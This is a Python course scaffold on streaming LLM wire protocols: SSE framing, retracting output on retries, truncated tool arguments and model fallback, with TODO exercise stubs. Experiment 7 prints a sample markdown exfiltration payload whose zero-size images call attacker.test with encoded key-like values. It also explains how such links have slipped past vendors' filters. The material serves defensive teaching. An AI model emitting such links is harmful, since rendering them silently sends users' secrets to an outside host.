"""L16 的脚手架（Python 镜像）。跑法：uv run python -m l16.wire

分两半：
    上半是**观察实验**，直接跑参考实现，让你先看见现象。不用写代码。
    下半是七个 TODO，你来实现。写完跑 `uv run python -m l16.verify`。

观察实验为什么放前面：这一节的坑分两类，而**两类都看不见**。
    一类是静默错误：CDN 把帧切开、流中途换模型、max_tokens 截断参数——
      HTTP 200，日志全绿，只是内容不对。
    一类是反向优化：打字机效果。它不是"没效果"，是**有负效果**，
      而它看起来恰恰像是在改善体验。

★ 全程一次模型都不调。这一节尤其不该调——它要测的全是结构性的东西：
    · 分帧 = 规范给的封闭规则集 → 纯函数
    · 撤回 = 协议定义的状态机 → 纯 reducer
    · 参数累积 = 官方三步契约 → 字符串拼接 + parse
    · 并行归位 = 按显式字段分组 → 纯 reducer
真去调模型会让这些结论不可复现，而且一次都测不到 fallback 这种罕见分支。

★ 为什么 L16 的界面没有 Python 版、只有这一层有：
界面是 React，镜像一份 Python 的 React 没有意义。但分帧、撤回、参数累积、
事件归位这四件事**和语言无关**——它们是协议和状态机，不是 UI。
"""

from __future__ import annotations

import json
import sys

from shared.wire import (
    Chunk,
    JsonAccumulator,
    RawToolEvent,
    Relay,
    View,
    apply_all,
    audit_links,
    parse_all,
    reassemble,
    visible_text,
)

DIM = "\x1b[2m"
BOLD = "\x1b[1m"
RED = "\x1b[31m"
GREEN = "\x1b[32m"
YELLOW = "\x1b[33m"
OFF = "\x1b[0m"


def dim(s: str) -> str:
    return f"{DIM}{s}{OFF}"


def bold(s: str) -> str:
    return f"{BOLD}{s}{OFF}"


def red(s: str) -> str:
    return f"{RED}{s}{OFF}"


def green(s: str) -> str:
    return f"{GREEN}{s}{OFF}"


def yellow(s: str) -> str:
    return f"{YELLOW}{s}{OFF}"


def _w(s: str) -> int:
    return sum(2 if "\u2e80" <= c <= "\u9fff" or "\uff00" <= c <= "\uffef" else 1 for c in s)


def pad(s: str, n: int) -> str:
    return s + " " * max(0, n - _w(s))


def rpad(s: str, n: int) -> str:
    return " " * max(0, n - _w(s)) + s


# ═════════════════════════════════════════════════════════════
# 上半：观察实验
# ═════════════════════════════════════════════════════════════


def fixture(sep: str = "\n\n") -> str:
    """一条确定性的假流。所有实验共用，所以每次跑结果都一样。"""
    head = sep[: len(sep) // 2] or "\n"
    return (
        f"event: message_start{head}"
        f'data: {{"type":"message_start"}}{sep}'
        f'data: {{"type":"text","delta":"先读一下配置文件。"}}{sep}'
        f'data: {{"type":"tool_use","name":"read","input":"{{\\"path\\":\\"cfg.ts\\"}}"}}{sep}'
        f'data: {{"type":"text","delta":"看起来端口写死了。"}}{sep}'
        f'data: {{"type":"message_stop"}}{sep}'
    )


def exp1() -> None:
    """实验一：一个只找 `\\n\\n` 的转发器，在混用行结束符的流上会怎样。

    ★ 这是 L02 欠条二（「转发不是搬运」）里最便宜的一个错。

    规范允许三种行结束符（CRLF / LF / CR）任意混用，所以「空行」有**八种**
    可分辨的字节组合。而 `find("\\n\\n")` 只认其中一种。

    注意它的失败方式：不是抛异常，是**一路攒到流结束才吐**。
    也就是你的流式接口"能用"，只是一点都不流——而这件事在本地测不出来，
    因为本地的服务端和浏览器之间没有那个会改写行结束符的中间层。
    """
    print(bold("\n实验一：只认 \\n\\n 的转发器，遇到混用行结束符"))
    print(dim("  同一条流，八种「空行」写法，看转发器能切出几帧。\n"))

    def naive_frames(src: str) -> int:
        """故意写错的版本：只找一种分隔符。"""
        buf, n = src, 0
        while True:
            i = buf.find("\n\n")
            if i == -1:
                break
            n += 1
            buf = buf[i + 2 :]
        return n

    combos = [
        ("CRLF+CRLF", "\r\n\r\n"),
        ("CRLF+LF", "\r\n\n"),
        ("CRLF+CR", "\r\n\r"),
        ("LF+CRLF", "\n\r\n"),
        ("LF+LF", "\n\n"),
        ("LF+CR", "\n\r"),
        ("CR+CRLF", "\r\r\n"),
        ("CR+CR", "\r\r"),
    ]

    print(dim("  " + pad("空行写法", 14) + rpad("只认 \\n\\n", 12) + rpad("按行切", 10) + "  结论"))
    for name, sep in combos:
        src = fixture(sep)
        naive = naive_frames(src)
        correct = len(Relay().push(src).emit)
        same = naive == correct
        nc = rpad(str(naive), 12)
        print(
            "  "
            + pad(name, 14)
            + (nc if same else red(nc))
            + green(rpad(str(correct), 10))
            + "  "
            + (dim("一致") if same else red(f"漏了 {correct - naive} 帧"))
        )

    print(
        dim(
            "\n  ★ 八种里只有两种是对的，而且第二种（CRLF+LF）是**碰巧**——\n"
            "    `\\r\\n\\n` 的尾部恰好含有一个 `\\n\\n`，位置也刚好对。\n"
            '    这种"碰巧对"比全错更危险：它让你在本地测通之后以为实现没问题。\n'
            "\n"
            "    其余六种全部漏成 0 帧。漏成 0 帧的意思是：\n"
            "    转发器手上攒着整条流，直到结束才一次吐出去。\n"
            "    用户看到的是转圈十秒、然后整段文字瞬间出现——而你的日志里\n"
            "    这是一次成功的流式响应。\n"
            "\n"
            "    WHATWG 规范自己就警告过这件事：\n"
            '    "HTTP chunking can have unexpected negative effects on the\n'
            '     reliability of this protocol"'
        )
    )


def exp2() -> None:
    """实验二：CDN 把帧切开，下游会怎么死。

    ★★ 这一条是 L02 欠条二的**一手证据**，不是我编的场景：
    Anthropic 官方 TypeScript SDK 有一个修复，标题就是
    "skip SSE events with empty data to prevent JSON parse crash"，
    原因是边缘环境的代理和 CDN 会把 SSE chunk 切开。
    """
    print(bold("\n实验二：把流在每个字节位置切开，下游活不活"))
    src = fixture()

    def naive_read(chunks: list[str]) -> tuple[int, str | None]:
        """naive 下游：每块自己 parse（很多人第一版就这么写）。"""
        events = 0
        for c in chunks:
            for line in c.split("\n"):
                if not line.startswith("data:"):
                    continue
                try:
                    json.loads(line[5:].strip())
                    events += 1
                except ValueError as e:
                    return events, str(e)[:40]
        return events, None

    crashes = wrong = stateful_wrong = 0
    want = len(parse_all([src]))
    for cut in range(1, len(src)):
        chunks = [src[:cut], src[cut:]]
        n, crash = naive_read(chunks)
        if crash:
            crashes += 1
        elif n != want:
            wrong += 1
        if len(parse_all(chunks)) != want:
            stateful_wrong += 1

    total = len(src) - 1
    print(dim(f"  这条流有 {len(src)} 字节、{want} 个事件。在每个位置切成两块试一遍。\n"))
    print(
        "  "
        + pad("每块直接 parse", 18)
        + red(f"崩 {crashes} 次")
        + dim(" / ")
        + yellow(f"静默少事件 {wrong} 次")
        + dim(f" / 共 {total} 个切点")
    )
    print(
        "  "
        + pad("有状态解析器", 18)
        + green(f"全部 {total} 个切点都正确")
        + dim(f"（{stateful_wrong} 崩溃、0 丢失）")
    )
    print(
        dim(
            "\n  ★ 注意「静默少事件」那一栏比崩溃更可怕：崩溃你会看见，\n"
            "    少一个事件只是这次回答短了一句，而你以为模型就是这么答的。\n"
            "\n"
            "    而且这不是理论风险。Anthropic 官方 SDK 修过这个 bug，\n"
            '    commit 标题是 "skip SSE events with empty data to prevent JSON\n'
            '    parse crash"，起因正是 CDN 重新分帧。\n'
            "\n"
            "    这就是为什么你的**服务端**转发这个流时要重新实现分帧：\n"
            "    上游给你的块边界和帧边界没有任何关系。"
        )
    )


def exp3() -> None:
    """实验三：一个只会 append 的前端，在流中途失败重试时会渲染出什么。

    ★★ 这是 L02 欠条一，也是这一节的中心论点。

    场景：模型写了半句，那一步失败了，服务端重试。因为 HTTP 头早就发出去了，
    服务端只能在流**内部**表达这件事——而这时半句话已经在屏幕上。
    """
    print(bold("\n实验三：流中途失败重试，屏幕上剩下什么"))

    stream = [
        Chunk(type="start-step"),
        Chunk(type="text-delta", id="t1", delta="我去读一下 config.ts，"),
        Chunk(type="text-delta", id="t1", delta="端口应该写在第 4"),
        # ↑ 这一步在这里失败了。服务端重试，并先发一个 reset-step。
        Chunk(type="reset-step"),
        Chunk(type="text-delta", id="t2", delta="我去读一下 config.ts，"),
        Chunk(type="text-delta", id="t2", delta="端口写在第 42 行，是硬编码的。"),
        Chunk(type="finish-step"),
    ]

    # 只会 append 的前端：把 reset-step 当成未知类型忽略掉
    append_only = "".join(c.delta for c in stream if c.type == "text-delta")
    correct = visible_text(apply_all(stream))

    print(dim("\n  只会 append 的前端渲染出："))
    print("    " + red(append_only))
    print(dim("\n  正确处理 reset-step 的前端渲染出："))
    print("    " + green(correct))
    print(
        dim(
            f"\n  ★ 前者多出了 {len(append_only) - len(correct)} 个字符，"
            "而且是**重复了半句话**——\n"
            "    用户看到的是「我去读一下 config.ts，端口应该写在第 4我去读一下……」。\n"
            "\n"
            "    这不是本课程编的设计。Vercel AI SDK 的线协议里就有这个 chunk，\n"
            '    官方源码注释是 "Removes all message parts added during the current step."，\n'
            "    用途写的正是「某一步重试了，失败那次的部分输出必须在替换输出\n"
            "    到达之前失效」。\n"
            "\n"
            "    所以 agent 前端的核心数据结构不是消息列表，是一个**带撤销点的\n"
            "    回滚缓冲区**。而这一点是普通 Web 应用里完全没有对应物的：\n"
            "    `state → view` 是纯函数，它从来不需要「撤回」。"
        )
    )


def exp4() -> None:
    """实验四：max_tokens 在参数中间截断，而这条路上没有任何错误信号。

    ★★ 这是 reset-step 之外**第二条**通往撤回的路径，而它更容易漏：
    流是正常结束的，HTTP 200，没有 error 事件，stop_reason 甚至不是个"错误"。
    """
    print(bold("\n实验四：HTTP 200、无错误事件，但参数只有一半"))

    half = '{"path":"src/config.ts","replace":"PORT=80'
    print(dim("\n  收到的参数字符串："))
    print("    " + yellow(half))

    guessed = half + '"}'  # 「补全」派
    a = JsonAccumulator()
    a.push(half)
    a.truncate()
    st = a.get()

    print(dim("\n  三种处理方式：\n"))
    print(
        "  "
        + pad("当成非法 JSON 修补", 20)
        + red(guessed)
        + dim("\n" + " " * 22 + "↑ 语法合法了，但 PORT=80 是模型想写的值吗？")
    )
    print(
        "  "
        + pad("当成普通 invalid", 20)
        + yellow("走 INVALID_JSON 回传给模型")
        + dim("  偏保守，但浪费一轮")
    )
    print(
        "  "
        + pad("识别 truncated", 20)
        + green(f"state={st.state}，不可执行")
        + dim("  撤回 + 提高 max_tokens 重试")
    )

    v = apply_all(
        [
            Chunk(type="start-step"),
            Chunk(type="text-delta", id="t", delta="我来改一下端口。"),
            Chunk(type="tool-input-start", id="x", tool_name="edit"),
            Chunk(type="tool-input-delta", id="x", delta=half),
            Chunk(type="stop-reason", reason="max_tokens"),
        ]
    )
    print(
        dim(
            f"\n  ★ 状态机的处理：撤回了 {v.retracted} 个 part，"
            f"正文保留「{visible_text(v)}」。\n"
            "\n"
            "    官方对这条路径有明文规定，而且方向很明确：\n"
            '    "Check the stop reason and decide whether to retry the request with a\n'
            '     higher max_tokens or repair the partial input."\n'
            "    以及：\"you'll need to retry the request with a higher max_tokens value\n"
            '     to get the full tool use"\n'
            "\n"
            "    所以参数状态是**四态**而不是两态：streaming / ready / invalid / truncated。\n"
            "    一个只有「合法/非法」的实现会把 truncated 归到非法，于是走上修补的路——\n"
            "    而修补一个被截断的参数，等于替模型猜它想干什么。"
        )
    )


def exp5() -> None:
    """实验五：打字机效果的代价。

    ★★ 这个实验是这一节最该亲手跑一遍的，因为它的结论和直觉相反，
    而且**两个方向同时相反**。

    通行的说法是「打字机效果让等待变得可以忍受」。但：

        代价一（纯算术，下面这张表）：内容已经到手了，打字机还让用户接着等。
        代价二（有一手实验依据）：Tombaugh 1985 发现理解率在 30 cps 和
          「瞬间全显」时最高，**15 cps 最差**。也就是慢速逐字显示不只是慢，
          是**更难读**。

    而收益那一侧：**查不到任何厂商的 A/B 数据表明流式输出改善满意度**，
    也查不到「最优打字机速度」的一手来源。

    所以这一节对打字机的诚实结论是：代价可测，收益无据。
    """
    print(bold("\n实验五：打字机效果让用户在内容到手之后继续等多久"))

    CHARS = 2000
    STREAM_MS = 8000

    print(dim(f"\n  一个 {CHARS} 字符的回答，流在 {STREAM_MS // 1000} 秒内全部到达客户端。\n"))
    print(
        dim(
            "  "
            + pad("渲染速率", 22)
            + rpad("显示完成", 12)
            + rpad("白等", 10)
            + rpad("DOM 更新次数", 14)
            + "  Tombaugh 1985"
        )
    )

    rows: list[tuple[str, int | None, str]] = [
        ("15 cps（慢速打字机）", 15, "理解率**最差**的那一档"),
        ("30 cps", 30, "理解率最高的两档之一"),
        ("60 cps", 60, "快于阅读速度，无额外收益"),
        ("到多少显多少（不节流）", None, "等价于「瞬间全显」那一档"),
    ]

    for label, cps, note in rows:
        done_ms = STREAM_MS if cps is None else round(CHARS / cps * 1000)
        waste = max(0, done_ms - STREAM_MS)
        # 不节流时按 60fps 合帧；打字机按每字符一次更新
        updates = round(STREAM_MS / 1000 * 60) if cps is None else CHARS
        # ★ 先按宽度补齐，再上色——ANSI 码会把宽度算乱
        # ★ 取整用 round，和 TS 侧的 Math.round 对齐。用 // 配 toFixed 会差一秒。
        waste_cell = rpad("0s" if waste == 0 else f"+{round(waste / 1000)}s", 10)
        print(
            "  "
            + pad(label, 22)
            + rpad(f"{round(done_ms / 1000)}s", 12)
            + (green(waste_cell) if waste == 0 else red(waste_cell))
            + rpad(str(updates), 14)
            + "  "
            + dim(note)
        )

    print(
        dim(
            "\n  ★ 15 cps 那一行是最坏的组合：显示完成要 133 秒，比内容到手晚了 125 秒，\n"
            "    DOM 更新 2000 次，而且它恰好落在 Tombaugh 实验里理解率最低的那一档。\n"
            "\n"
            '    Tombaugh 1985（ACM SIGCHI Bulletin，"The effect of VDU text-presentation\n'
            '    rate on reading comprehension and reading speed"）的结论是理解率在\n'
            "    **30 cps 和瞬间全显时最高，15 cps 最差**。\n"
            "\n"
            "    而 Anthropic 自己的建议是渲染前先缓冲几个 token，理由是避免过多的\n"
            "    DOM 更新——注意这是为了**性能**，不是为了好看。"
        )
        + "\n"
        + yellow("\n    收益那一侧必须如实说：")
        + dim(
            "查不到任何厂商的 A/B 数据表明流式输出\n"
            "    改善满意度，也查不到「最优打字机速度」的一手来源。所以这一节\n"
            "    不会告诉你该用多少 cps——它只告诉你慢速打字机的代价是可测的。"
        )
    )


def exp6() -> None:
    """实验六：模型在流中途换了，而你的解析器可能把它当成一个空的工具调用。

    ★ 「一条流对应一个模型」这个假设是错的。
    """
    print(bold("\n实验六：流中途换模型，靠什么看出来"))

    events = [
        RawToolEvent(seq=1, item_id="a", output_index=0, phase="start", tool_name="read"),
        RawToolEvent(seq=2, item_id="a", output_index=0, phase="delta", delta='{"path":"cfg.ts"}'),
        RawToolEvent(seq=3, item_id="a", output_index=0, phase="stop"),
        # ↓ 只有 start 和 stop、一条 delta 都没有：这是一个模型边界
        RawToolEvent(seq=4, item_id="fb", output_index=1, phase="start"),
        RawToolEvent(seq=5, item_id="fb", output_index=1, phase="stop"),
        RawToolEvent(seq=6, item_id="b", output_index=2, phase="start", tool_name="edit"),
        RawToolEvent(seq=7, item_id="b", output_index=2, phase="delta", delta='{"path":"cfg.ts"}'),
        RawToolEvent(seq=8, item_id="b", output_index=2, phase="stop"),
    ]

    r = reassemble(events)
    print(dim("\n  一条流里有三个块，其中一个是零 delta 的。\n"))
    print("  " + pad("识别为工具调用", 18) + green(str(len(r.calls))) + dim(" 个（read、edit）"))
    print(
        "  "
        + pad("识别为模型边界", 18)
        + green(str(r.model_boundaries))
        + dim("  ← 这一格不是工具调用")
    )
    print(
        dim(
            "\n  ★ 一个假设「每个块至少有一个 delta」的解析器，会把它当成一个\n"
            "    参数为空的工具调用——于是界面上多出一个名字是空串、参数是 {} 的卡片。\n"
            "\n"
            "    官方原文：\n"
            '    "during server-side fallback responses, a fallback content block arrives\n'
            "     at each model boundary as a content_block_start and content_block_stop\n"
            '     pair with no deltas in between"\n'
            "\n"
            "    而这件事有 UI 后果，而不只是解析问题：**你可能需要在流中途告诉\n"
            "    用户「下面这段是另一个模型写的」。** 普通 Web 应用里没有对应物。"
        )
    )


def exp7() -> None:
    """实验七：渲染模型输出等于把不可信数据送进渲染层。

    ★★ 接 L14（prompt 注入）和 L15（外链本身就是外泄通道）。
    """
    print(bold('\n实验七：一段"看起来什么都没显示"的 markdown'))

    evil = "\n".join(
        [
            "好的，我已经读完了配置。",
            "",
            "![](https://attacker.test/p?d=QUtJQTEyMzQ1Njc4OTA)",
            "![载入中][ref]",
            "",
            "[ref]: https://attacker.test/q?d=c2stYW50LWFwaTAz",
            '<img src="//attacker.test/r?d=dG9rZW4">',
        ]
    )

    audit = audit_links(evil, ["cdn.trusted.test"])
    print(dim("\n  模型输出里夹了三个外链，界面上它们都不显示内容：\n"))
    for u in audit.offending:
        print("    " + red(u))
    print(
        dim(
            "\n  ★ 三种形式都要抓：内联式 `![](url)`、参考式 `![t][ref]` + `[ref]: url`、\n"
            "    以及内联 HTML。漏掉参考式的过滤器被真实绕过过。\n"
            "\n"
            "    关键在于**渲染即发送**——不需要用户点击。一个宽 0 高 0 的图片\n"
            "    在界面上什么都不显示，但 query string 里的数据已经出去了。\n"
            "    而它长得像一个正常的 UI 元素。\n"
            "\n"
            "    所以这里的判定必须是**白名单**：\n"
            f"    这段 markdown 里一共 {len(audit.found)} 个外部资源，"
            f"{len(audit.offending)} 个不在白名单内。\n"
            "    L14 那张表里五个厂商的过滤全被绕过过，包括一个带 HMAC 签名的图片代理。"
        )
    )


def observe() -> None:
    exp1()
    exp2()
    exp3()
    exp4()
    exp5()
    exp6()
    exp7()


# ═════════════════════════════════════════════════════════════
# 下半：你的实现
# ═════════════════════════════════════════════════════════════
#
# ★ 七个 TODO 的完整要求写在 l16/wire.ts 里，这里不重复一遍中文说明——
# 两处维护同一段话，迟早会不一致。下面只列签名和一句提示。
#
# 想在 Python 侧做练习：把 l16/wire.ts 的 TODO 注释对照着看，
# 在这里实现，然后跑 `uv run python -m l16.verify`。


class MySseParser:
    """TODO 1：SSE 帧解析器。**这是本节最该自己写一遍的一个。**

    十条规则见 wire.ts。★ 最容易漏的三条：
    行结束符有三种且可混用；空的 `id:` 是重置而不是忽略；
    流末尾没有以空行收尾的事件要**直接丢弃**。
    """

    def feed(self, chunk: str) -> list[object]:
        raise NotImplementedError("TODO 1 未实现")

    def end(self) -> None:
        raise NotImplementedError("TODO 1 未实现")

    @property
    def reconnection_time_ms(self) -> int | None:
        raise NotImplementedError("TODO 1 未实现")


def my_find_frame_end(s: str) -> int | None:
    """TODO 2：找出第一个帧结束位置（含结束符），没有完整帧返回 None。

    ★ 不要用 `find("\\n\\n")`。实验一已经让你看见后果了——「空行」有八种
    可分辨的字节组合。按行切，不要搜分隔符。
    """
    raise NotImplementedError("TODO 2 未实现")


def my_apply_chunk(v: View, c: Chunk) -> View:
    """TODO 3：渲染缓冲区的 reducer。**这是这一节的中心论点所在。**

    ★ 最容易写错的两条：没有 step 边界时 `reset-step` 清空**全部** part；
    以及**未知的 chunk 类型要静默忽略，不能抛错**——「严格校验」在流式协议里
    是 bug，不是美德。
    """
    raise NotImplementedError("TODO 3 未实现")


class MyJsonAccumulator:
    """TODO 4：流式工具参数的累积器。

    ★ 四个状态（streaming / ready / invalid / truncated），而不是两态。
    而且「能展示」和「能执行」是两件事：**审批必须卡在 can_execute 上**。
    """

    def push(self, delta: str) -> None:
        raise NotImplementedError("TODO 4 未实现")

    def close(self) -> None:
        raise NotImplementedError("TODO 4 未实现")

    def truncate(self) -> None:
        raise NotImplementedError("TODO 4 未实现")

    def get(self) -> object:
        raise NotImplementedError("TODO 4 未实现")


def my_reassemble(events: list[RawToolEvent]) -> object:
    """TODO 5：并行工具调用的事件归位。

    ★ 一个按到达顺序往「当前工具」上追加的实现会把 B 的参数拼到 A 上，
    而这个 bug 在**只有一个工具调用时完全不可见**。
    另外：零 delta 的块不是工具调用，是模型边界。
    """
    raise NotImplementedError("TODO 5 未实现")


def my_check_resumable(v: View) -> object:
    """TODO 6：中断之后，怎么构造下一轮请求。

    ★★ 这个 TODO 的职责是**拦住**一个很自然的想法：prefill 在 Claude 4.6
    及以后直接返回 400。所以下一轮请求体的末尾**不能是 assistant 消息**。
    """
    raise NotImplementedError("TODO 6 未实现")


def my_audit_links(markdown: str, allowed_hosts: list[str]) -> object:
    """TODO 7：扫出一段 markdown 里会**自动发起网络请求**的外链。

    ★★ `//host/path` 这种协议相对 URL 要算违规，而且这条判断必须排在
    「以 / 开头就是站内路径」**之前**——整个函数里唯一一处顺序写错
    就变成安全漏洞的地方。
    """
    raise NotImplementedError("TODO 7 未实现")


# ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    observe()
    sys.stdout.write(
        dim("\n  下一步：实现文件下半部分的七个 TODO，然后跑 uv run python -m l16.verify。\n")
        + dim("  想先确认测试本身是对的，跑 WIRE_IMPL=shared uv run python -m l16.verify。\n")
        + dim("  交付物那个界面只有 TS 版，在 labs/l16/ui/，跑 pnpm ui。\n")
        + "\n"
    )
